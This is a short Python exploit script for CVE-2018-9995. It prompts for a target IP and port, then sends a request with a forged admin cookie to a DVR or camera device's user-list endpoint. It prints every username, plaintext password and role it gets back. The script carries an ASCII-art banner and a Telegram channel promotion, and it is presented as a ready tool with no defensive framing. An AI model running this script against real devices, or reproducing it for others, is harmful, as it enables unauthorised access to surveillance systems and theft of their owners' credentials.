# CVE => 2018-9995 | writer => @esfelurm
from os import system as Sys
try:from requests import get as Felurm
except:Sys("pip install requests")
from json import loads as Ls
rd, gn, lgn, yw, lrd, be, pe = '\033[00;31m', '\033[00;32m', '\033[01;32m', '\033[01;33m', '\033[01;31m', '\033[00;34m', '\033[01;35m'
cn = '\033[00;36m'
try:Sys("clear")
except:Sys("cls")
HOST,port = input(f"""{rd}
-.   ) (`-.                             .-') _    
 _(  OO)   ( OO ).                          (  OO) )   
(,------. (_/.  \_)-.              .-----.  /     '._  
 |  .---'  \  `.'  /              '  .--./  |'--...__) 
 |  |       \     /\              |  |('-.  '--.  .--' 
(|  '--.     \   \ |    (`-.     /_) |OO  )    |  |    
 |  .--'    .'    \_)  (OO  )_   ||  |`-'|     |  |    
 |  `---.  /  .'.  \  ,------.) (_'  '--'\     |  |    
 `------' '--'   '--' `------'     `-----'     `--'    
{lrd}Telegram channel: {pe}https://t.me/EsfeLurM
\n{lrd}[{lgn}?{lrd}]{lgn} Enter the target IP : {cn}"""),input(f"\n{lrd}[{lgn}?{lrd}]{lgn} The desired port number : {cn}")
if 'http://' in HOST:pass
if 'http://' not in HOST:host = "http://"+HOST+":"+str(port)+"/device.rsp?opt=user&cmd=list"
headers = {f"Host":host,"User-Agent":"Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Accept-Languag":"es-AR,en-US;q=0.7,en;q=0.3","Connection":"close","Content-Type":"text/html","Cookie":"uid="+"admin"}
try:Json = Ls(Felurm(host,headers=headers,timeout=10).text)
except Exception:print(f"{lrd}Error | {rd}Communication was not established  !")
try:
    for obj in range(0,len(Json["list"])):print (f"{yw}---------------------------------\n\n{lgn}Username {pe}: {cn}{Json['list'][obj]['uid']} \n{lgn}Password {pe}: {cn}{Json['list'][obj]['pwd']}\n{lgn}Role {pe}: {cn}{Json['list'][obj]['role']}\n{lgn}Number of visits {pe}: {cn}{Json['list'][obj]['view']}\n{yw}---------------------------------")
except Exception:print(f"{lrd}Error | {rd}This camera is not vulnerable ")